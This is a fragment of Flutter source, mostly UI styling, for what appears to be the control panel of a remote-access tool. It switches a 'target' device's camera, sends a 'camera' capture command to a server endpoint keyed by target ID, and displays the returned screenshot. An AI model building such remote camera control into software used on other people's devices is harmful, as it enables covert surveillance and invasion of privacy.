                          decoration: BoxDecoration(
                            color: Colors.white.withOpacity(0.1),
                            borderRadius: BorderRadius.circular(4),
                          ),
                          child: Text(
                            _currentFacing.toUpperCase(),
                            style: const TextStyle(
                              color: Color(0x99FFFFFF),
                              fontSize: 10,
                              letterSpacing: 1,
                            ),
                          ),
                        ),
                      ],
                    ),
                    Text(
                      widget.targetModel,
                      style: const TextStyle(
                        color: Color(0x66FFFFFF),
                        fontSize: 10,
                        letterSpacing: 1,
                      ),
                    ),
                  ],
                ),
              ),
            ),

            Positioned(
              top: 20,
              right: 20,
              child: GestureDetector(
                onTap: widget.onClose,
                child: Container(
                  width: 40,
                  height: 40,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: Colors.white.withOpacity(0.05),
                    border: Border.all(color: Colors.white.withOpacity(0.1)),
                  ),
                  child: const Icon(
                    Icons.close,
                    color: Colors.white,
                    size: 20,
                  ),
                ),
              ),
            ),

            Positioned(
              bottom: 55,
              left: 30,
              child: GestureDetector(
                onTap: () {
                  final newFacing = _currentFacing == 'front' ? 'back' : 'front';
                  setState(() {
                    _currentFacing = newFacing;
                    _isLoading = true;
                    _currentFrame = '';
                  });
                  widget.onSwitchCamera(newFacing);
                  _fetchFrame();
                },
                child: Container(
                  width: 44,
                  height: 44,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: Colors.white.withOpacity(0.05),
                    border: Border.all(color: Colors.white.withOpacity(0.1)),
                  ),
                  child: const Icon(
                    Icons.switch_camera,
                    color: Color(0x99FFFFFF),
                    size: 22,
                  ),
                ),
              ),
            ),

            Positioned(
              bottom: 55,
              right: 30,
              child: GestureDetector(
                onTap: widget.onClose,
                child: Container(
                  width: 44,
                  height: 44,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: Colors.red.withOpacity(0.1),
                    border: Border.all(color: Colors.red.withOpacity(0.2)),
                  ),
                  child: const Icon(
                    Icons.stop,
                    color: Color(0x99FF0000),
                    size: 22,
                  ),
                ),
              ),
            ),

            Positioned(
              bottom: 50,
              left: 0,
              right: 0,
              child: Center(
                child: GestureDetector(
                  onTap: () {
                    _sendCommand('camera', extra: _currentFacing);
                  },
                  child: Container(
                    width: 60,
                    height: 60,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      color: Colors.white.withOpacity(0.05),
                      border: Border.all(color: Colors.white.withOpacity(0.15), width: 2),
                    ),
                    child: const Icon(
                      Icons.camera_alt,
                      color: Colors.white,
                      size: 28,
                    ),
                  ),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  void _sendCommand(String command, {String? extra}) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final token = prefs.getString('key') ?? '';
      await http.post(
        Uri.parse("$baseUrl/api/command/${widget.targetId}"),
        headers: {"Content-Type": "application/json", "x-auth-token": token},
        body: jsonEncode({"command": command, "value": extra ?? ""}),
      );
    } catch (_) {}
  }
}

// ─── WIDGET SCREENSHOT RESULT ────────────────────────────────────────
class ScreenshotResultPage extends StatelessWidget {
  final String targetModel;
  final String screenshotFrame;
  final String screenshotFacing;
  final VoidCallback onClose;

  const ScreenshotResultPage({
    Key? key,
    required this.targetModel,
    required this.screenshotFrame,
    required this.screenshotFacing,
    required this.onClose,
  }) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black.withOpacity(0.95),
      body: SafeArea(
        child: Stack(
          children: [
            Center(
              child: InteractiveViewer(
                minScale: 0.5,
                maxScale: 3.0,
                child: Image.memory(
                  base64Decode(screenshotFrame.split(',').last),
                  fit: BoxFit.contain,
                  width: MediaQuery.of(context).size.width * 0.9,
                  height: MediaQuery.of(context).size.height * 0.7,
                  errorBuilder: (context, error, stackTrace) {
                    return const Center(
                      child: Text(
                        "Gagal load gambar",
                        style: TextStyle(color: Colors.white54),
                      ),
                    );
                  },
                ),
              ),
            ),
            Positioned(
              top: 0,
              left: 0,
              right: 0,
              child: Container(
                padding: const EdgeInsets.all(16),
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    begin: Alignment.topCenter,
                    end: Alignment.bottomCenter,
                    colors: [Colors.black.withOpacity(0.75), Colors.transparent],
                  ),
                ),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: [
                    Row(
                      children: [
                        Container(
                          width: 8,
                          height: 8,
                          decoration: const BoxDecoration(
                            color: Colors.red,
                            shape: BoxShape.circle,
                          ),
                        ),
                        const SizedBox(width: 8),
                        Text(
                          "KAMERA ${screenshotFacing.toUpperCase()}",
                          style: const TextStyle(
                            color: Colors.white,
                            fontSize: 12,
                            letterSpacing: 2,
                          ),
                        ),
                        const SizedBox(width: 12),
                        Text(
                          targetModel,
                          style: TextStyle(
                            color: Colors.white.withOpacity(0.4),
                            fontSize: 9,
                            letterSpacing: 1,
                          ),
                        ),
                      ],
                    ),
                    Text(
                      DateTime.now().toLocal().toString().substring(11, 19),
                      style: TextStyle(
                        color: Colors.white.withOpacity(0.4),
                        fontSize: 9,
                        letterSpacing: 1,
                      ),
                    ),
                  ],
                ),
              ),
            ),
            Positioned(
              top: 16,
              right: 16,
              child: GestureDetector(
                onTap: onClose,
                child: Container(
                  width: 40,
                  height: 40,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: Colors.white.withOpacity(0.05),
                    border: Border.all(color: Colors.white.withOpacity(0.1)),
                  ),
                  child: const Icon(
                    Icons.close,
                    color: Colors.white,
                    size: 20,
                  ),
                ),
              ),
            ),
            Positioned(
              bottom: 0,
              left: 0,
              right: 0,
              child: Container(
                padding: const EdgeInsets.symmetric(vertical: 16, horizontal: 16),
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    begin: Alignment.bottomCenter,
                    end: Alignment.topCenter,
                    colors: [Colors.black.withOpacity(0.75), Colors.transparent],
                  ),
                ),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    GestureDetector(
                      onTap: () {},
                      child: Container(
                        width: 44,
                        height: 44,
                        decoration: BoxDecoration(
                          shape: BoxShape.circle,
                          border: Border.all(color: Colors.white.withOpacity(0.1), width: 1),
                        ),
                        child: const Icon(Icons.zoom_out, color: Colors.white),
                      ),
                    ),
                    const SizedBox(width: 20),
                    const Text(
                      "100%",
                      style: TextStyle(
                        color: Colors.white,
                        fontSize: 12,
                        fontFamily: 'monospace',
                      ),
                    ),
                    const SizedBox(width: 20),
                    GestureDetector(
                      onTap: () {},
                      child: Container(
                        width: 44,
                        height: 44,
                        decoration: BoxDecoration(
                          shape: BoxShape.circle,
                          border: Border.all(color: Colors.white.withOpacity(0.1), width: 1),
                        ),
                        child: const Icon(Icons.zoom_in, color: Colors.white),
                      ),
                    ),
                    const SizedBox(width: 24),
                    ElevatedButton.icon(
                      onPressed: () {},
                      icon: const Icon(Icons.download, size: 18),
                      label: const Text("DOWNLOAD"),
                      style: ElevatedButton.styleFrom(
                        backgroundColor: Colors.blueAccent.withOpacity(0.2),
                        foregroundColor: Colors.white,
                      ),
                    ),
                    const SizedBox(width: 12),
                    ElevatedButton.icon(
                      onPressed: onClose,
                      icon: const Icon(Icons.close, size: 18),
                      label: const Text("TUTUP"),
                      style: ElevatedButton.styleFrom(
                        backgroundColor: Colors.white.withOpacity(0.1),
                        foregroundColor: Colors.white,
                      ),
                    ),
                  ],
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// ══════════════════════════════════════════════════════════════════════════
//  _NeoCtrlTile — 1:1 port dari .ctrl-tile (design.html)
//  background:#facc15 ; border-radius:0 ; border 2px top/left, 5px right/bottom #000
//  padding 14 13 13 ; min-height 110 ; gap 10 ; hover : #eab308 + translate(-2,-2)
//  icon box 36x36 radius 0 border 2px #000 solid-fill ; name Rajdhani 13 w800
//  sub Space Mono 7 rgba(0,0,0,.55) w700
// ══════════════════════════════════════════════════════════════════════════
class _NeoCtrlTile extends StatefulWidget {
  final String label;
  final String sub;
  final IconData icon;
  final Color iconColor;
  final VoidCallback? onTap;
  final Widget? trailing;
  final bool showTrailing;
  final Color bg;
  final Color bgHover;
  final Color border;

  const _NeoCtrlTile({
    required this.label,
    required this.sub,
    required this.icon,
    required this.iconColor,
    required this.onTap,
    this.trailing,
    this.showTrailing = true,
    required this.bg,
    required this.bgHover,
    required this.border,
  });

  @override
  State<_NeoCtrlTile> createState() => _NeoCtrlTileState();
}

class _NeoCtrlTileState extends State<_NeoCtrlTile> {
  bool _hovered = false;
  bool _pressed = false;

  bool get _isHighlighted => _hovered || _pressed;

  // HTML: default right/bottom 5px ; hover 6px ; active 3px
  double get _thickSide => _pressed ? 3 : (_hovered ? 6 : 5);
  // HTML: default translate(0,0) ; hover (-2,-2) ; active (2,2)
  Offset get _offset {
    if (_pressed) return const Offset(2, 2);
    if (_hovered) return const Offset(-2, -2);
    return Offset.zero;
  }

  @override
  Widget build(BuildContext context) {
    return MouseRegion(
      cursor: SystemMouseCursors.click,
      onEnter: (_) => setState(() => _hovered = true),
      onExit: (_) => setState(() => _hovered = false),
      child: GestureDetector(
        onTapDown: (_) => setState(() => _pressed = true),
        onTapUp: (_) => setState(() => _pressed = false),
        onTapCancel: () => setState(() => _pressed = false),
        onTap: widget.onTap,
        child: AnimatedContainer(
          duration: const Duration(milliseconds: 250),
          curve: const Cubic(0.34, 1.56, 0.64, 1), // CSS cubic-bezier hover
          transform: Matrix4.translationValues(_offset.dx, _offset.dy, 0),
          constraints: const BoxConstraints(minHeight: 110),
          padding: const EdgeInsets.fromLTRB(13, 14, 13, 13),
          decoration: BoxDecoration(
            color: _isHighlighted ? widget.bgHover : widget.bg,
            borderRadius: BorderRadius.zero,
            border: Border(
              top: BorderSide(color: widget.border, width: 2),
              left: BorderSide(color: widget.border, width: 2),
              right: BorderSide(color: widget.border, width: _thickSide),
              bottom: BorderSide(color: widget.border, width: _thickSide),
            ),
            // HTML: box-shadow: 0 4px 0 rgba(0,0,0,.1), inset 0 1px 0 rgba(255,255,255,.5)
            // hover: 0 6px 0 rgba(0,0,0,.15) / .6 ; active: 0 2px 0 rgba(0,0,0,.1) / .4
            boxShadow: [
              BoxShadow(
                color: _pressed
                    ? const Color(0x1A000000)
                    : (_hovered ? const Color(0x26000000) : const Color(0x1A000000)),
                offset: Offset(0, _pressed ? 2 : (_hovered ? 6 : 4)),
                blurRadius: 0,
              ),
              BoxShadow(
                color: _pressed
                    ? const Color(0x66000000)
                    : (_hovered ? const Color(0x99000000) : const Color(0x80000000)),
                offset: const Offset(0, 1),
                blurRadius: 0,
                // inset layer (putih) disimulasikan dengan opacity rendah
                spreadRadius: 0,
              ),
            ],
          ),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            mainAxisSize: MainAxisSize.min,
            children: [
              // ── tile-top: icon kiri, trailing/chevron kanan ──
              Row(
                crossAxisAlignment: CrossAxisAlignment.start,
                mainAxisAlignment: MainAxisAlignment.spaceBetween,
                children: [
                  _buildIconBox(),
                  if (widget.showTrailing)
                    widget.trailing ?? _buildTapChevron()
                  else
                    const SizedBox.shrink(),
                ],
              ),
              const SizedBox(height: 10), // .ctrl-tile gap:10px
              // ── blok teks (tile-name + tile-sub) ──
              Text(
                widget.label,
                maxLines: 2,
                overflow: TextOverflow.ellipsis,
                style: const TextStyle(
                  fontFamily: 'Rajdhani',
                  fontSize: 13,
                  fontWeight: FontWeight.w700, // Rajdhani-Bold (HTML: 800)
                  color: Color(0xFF000000),
                  letterSpacing: 0.5,
                  height: 1.15,
                ),
              ),
              const SizedBox(height: 1), // .tile-sub margin-top:1px
              Text(
                widget.sub,
                maxLines: 1,
                overflow: TextOverflow.ellipsis,
                style: const TextStyle(
                  fontFamily: 'ShareTechMono',
                  fontSize: 7, // .tile-sub font-size:7px
                  fontWeight: FontWeight.w700,
                  color: Color(0x8C000000), // rgba(0,0,0,0.55)
                  letterSpacing: 0.5,
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  // .tile-icon{ 36x36 ; radius 0 ; border 2px solid #000 ; flex center }
  Widget _buildIconBox() {
    return Container(
      width: 36,
      height: 36,
      decoration: BoxDecoration(
        color: widget.iconColor,
        borderRadius: BorderRadius.zero,
        border: Border.all(color: widget.border, width: 2),
      ),
      alignment: Alignment.center,
      child: Icon(widget.icon, color: Colors.white, size: 16),
    );
  }

  // .tile-tap : chevron › 10x10, warna ikon — penanda tile bisa ditap
  Widget _buildTapChevron() {
    return Padding(
      padding: const EdgeInsets.only(top: 2),
      child: Icon(
        Icons.chevron_right,
        size: 14,
        color: widget.iconColor,
      ),
    );
  }
}
